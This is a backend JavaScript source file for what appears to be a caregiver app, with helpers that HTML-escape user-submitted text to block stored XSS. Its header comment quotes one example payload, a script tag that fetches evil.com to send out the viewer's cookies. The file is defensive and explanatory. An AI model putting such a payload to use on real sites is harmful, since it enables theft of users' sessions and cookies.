/**
 * Basic HTML/XSS sanitization for user-generated text fields.
 *
 * WHY THIS EXISTS:
 * When a care receiver writes a review comment like:
 *   "Great caregiver! <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
 *
 * If we store it raw and the frontend renders it with innerHTML or dangerouslySetInnerHTML,
 * the script executes in every browser that views the review — stealing cookies, session
 * tokens, or redirecting to phishing sites.
 *
 * This is called Stored XSS (Cross-Site Scripting) — the most dangerous kind because
 * the attacker doesn't need to trick each victim into clicking a link. The payload
 * lives in your database and auto-executes for every viewer.
 *
 * WHERE TO USE:
 * Any field that stores user-generated free text AND might be rendered in a browser:
 * - review.comment
 * - appointment.notes
 * - message.content
 * - caregiver_profiles.bio
 * - appointment.cancellation_reason
 */

/**
 * Strip HTML tags and encode dangerous characters.
 * Not a full sanitizer like DOMPurify (that's for the frontend).
 * This is a defense-in-depth layer on the backend.
 */
function sanitizeHtml(input) {
  if (typeof input !== 'string') return input;

  return input
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

/**
 * Recursively sanitize all string values in an object.
 * Use on req.body before passing to the model.
 */
function sanitizeObject(obj) {
  if (typeof obj === 'string') return sanitizeHtml(obj);
  if (typeof obj !== 'object' || obj === null) return obj;
  if (Array.isArray(obj)) return obj.map(sanitizeObject);

  const result = {};
  for (const [key, value] of Object.entries(obj)) {
    result[key] = sanitizeObject(value);
  }
  return result;
}

module.exports = { sanitizeHtml, sanitizeObject };
